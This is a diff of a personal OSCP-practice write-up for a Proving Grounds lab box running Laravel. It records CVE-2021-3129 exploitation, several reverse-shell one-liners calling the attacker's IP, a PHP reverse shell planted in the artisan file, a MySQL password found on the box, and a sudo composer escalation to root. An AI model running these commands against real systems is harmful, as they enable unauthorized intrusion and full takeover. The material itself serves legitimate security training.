@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-11
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Intermediate
@@ -63,95 +64,95 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 No enumeration conducted
 ## Port 80 - HTTP (Apache)
 - Navigated to `http://192.168.201.38:80` and used Wappalyzer to identify `W3.CSS` & `Font Awesome 4.7.0`
-![[Pasted image 20241010194628.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010194628.png]]
 - Navigated to bottom of `http://192.168.201.38:80`, identified contact form, and entered test message
-![[Pasted image 20241010194917.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010194917.png]]
 - Message submission redirected to `404 not found` and identified `Laravel 8.4.0`
-![[Pasted image 20241010195100.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010195100.png]]
 		- `Laravel 8.4.0` is vulnerable to [CVE-2021-3129](https://nvd.nist.gov/vuln/detail/CVE-2021-3129) (arbitary code execution for unauthenticated users for sites in debug mode with Laravel before 8.4.2)
 - Ran `gobuster dir -u http://192.168.201.38 -w //usr/share/dirb/wordlists/common.txt` to identify any web directories
-![[Pasted image 20241010195523.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010195523.png]]
 - Navigated to `http://192.168.201.38/login` and identified page for "Login" or "Register"
-![[Pasted image 20241010195812.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010195812.png]]
 - Unsuccessful with "offsec@kali" and password `pass`
-![[Pasted image 20241010195947.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010195947.png]]
 - Navigated to `http://192.168.201.38/register`, registered user with credentials `offsec:password` (email: offsec@kali.com), and redirected to `http://192.168.201.38/home` with access to "Dashboard testing Area"
-![[Pasted image 20241010200445.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010200445.png]]
 - Navigated to `http://192.168.201.38/robots.txt` 
-![[Pasted image 20241010195628.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010195628.png]]
 - Navigated to `http://192.168.201.38/web.config` and viewed page source (potentially using `Microsoft IIS service`)
-![[Pasted image 20241010200759.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010200759.png]]
 ---
 # Exploitation
 ## Name of the technique
 - Clicked "Enable" to enable debugging
-![[Pasted image 20241010202820.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010202820.png]]
 - Tested access to `http://192.168.201.38/_ignition/execute-solution` to confirm debug mode in ON and determine Laravel root directory is `/var/www/html/lavita`
-![[Pasted image 20241010205327.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010205327.png]]
 - Identified `laravel-8.4.2-rce` exploit from `https://github.com/khanhnv-2091/laravel-8.4.2-rce/blob/main/exploit.py`
 	- Saved `exploit.py` as `laravelexploit.py` and ran `python3 laravelexploit.py http://192.168.201.38:80 /var/www/html/laravel/storage/logs/laravel.log 'uname -a'`
-![[Pasted image 20241010203951.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010203951.png]]
 - Identified `CVE-2021-3129` exploit from `https://github.com/joshuavanderpoll/CVE-2021-3129/blob/main/CVE-2021-3129.py`
 	- Saved `CVE-2021-3129.py` and ran `python3 CVE-2021-3129.py --host http://192.168.201.38 --exec 'uname -a' --force
-![[Pasted image 20241010210303.png]]
-![[Pasted image 20241010210346.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010210303.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010210346.png]]
 - Reran exploit with bash command for reverse shell but received no output or reverse shell: `python3 CVE-2021-3129.py --host http://192.168.201.38 --exec 'bash -i >& /dev/tcp/192.168.45.215/4444 0>&1' --force`
-![[Pasted image 20241010210606.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241010210606.png]]
 - Reran exploit with netcat command for reverse shell but no output and no reverse shell: 
 ```
 python3 CVE-2021-3129.py --host http://192.168.117.38
 execute nc 192.168.45.250 4444 -e /bin/sh
 ```
 - Reran exploit with same command but testing the next chain
-![[Pasted image 20241011191852.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011191852.png]]
 - Command above hung, and checked other tab to find incoming reverse shell 
-![[Pasted image 20241011192016.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011192016.png]]
 ---
 # Lateral Movement to user
 ## Local Enumeration
 - Ran `cat /etc/passwd` and identified user `skunk`
-![[Pasted image 20241011192138.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011192138.png]]
 - Navigated to `/home/skunk`, identified `local.txt`, and printed file with `cat /home/skunk/local.txt`
-![[Pasted image 20241011192557.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011192557.png]]
 - Navigated to `/var/www/html/lavita/storage`, ran `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh` to download `linpeas.sh`, and used `chmod +x linpeas.sh` to make it executable
-![[Pasted image 20241011193123.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011193123.png]]
 - Ran `./linpeas.sh` and identified multiple processes belonging to `www-data` but user is `root`
-![[Pasted image 20241011193436.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011193436.png]]
 - Identified `ptrace` protection is *disabled*
-![[Pasted image 20241011193641.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011193641.png]]
 - Identified user `skunk` is a member of `sudo`
-![[Pasted image 20241011194844.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011194844.png]]
 - Identified `postfix` file
-![[Pasted image 20241011193902.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011193902.png]]
 - Identified `mysql` credentials (`lavita:sdfquelw0kly9jgbx92`)
-![[Pasted image 20241011194047.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011194047.png]]
 - Identified other interesting files
-![[Pasted image 20241011194148.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011194148.png]]
 - Tested `su skunk` using credentials `skunk:skunk`
-![[Pasted image 20241011194628.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011194628.png]]
 - Uploaded `pspy32` to target
-![[Pasted image 20241011195835.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011195835.png]]
 - Ran `./pspy32` and identified processes running for user `skunk` (UID=1001)
-![[Pasted image 20241011200348.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011200348.png]]
 - Run `ls -lah /var/www/html/lavita/artisan` to check permissions for artisan, and identify that user `www-data` has write access
-![[Pasted image 20241011201020.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011201020.png]]
 - Ran `cat /var/www/html/lavita/artisan` & identified php file
-![[Pasted image 20241011201506.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011201506.png]]
 ## Lateral Movement vector
 - Ran `nc -nvlp 4545` to start netcat listener on port 4545
 - Ran `echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.250 4545>/tmp/f'); ?>" > /var/www/html/lavita/artisan` to echo PHP reverse shell script into `artisan` file
 - Caught reverse shell with netcat as `skunk` user
-![[Pasted image 20241011202317.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011202317.png]]
 ---
 # Privilege Escalation
 ## Local Enumeration
 - `skunk` previously identified as member of `sudo` group, so ran `sudo -l`
-![[Pasted image 20241011202424.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011202424.png]]
 ## Privilege Escalation vector
 - Identified [GTFObins](https://gtfobins.github.io/gtfobins/composer/#sudo) for `composer` run by `sudo`, so modified `composer.json` with `echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json` as `www-data` user
-![[Pasted image 20241011203853.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011203853.png]]
 - Ran `sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x` as `skunk` user and gained `root` access
-![[Pasted image 20241011203943.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241011203943.png]]
 - Ran `cat /root/proof.txt` to print `proof.txt`
 ---
 # Trophy & Loot
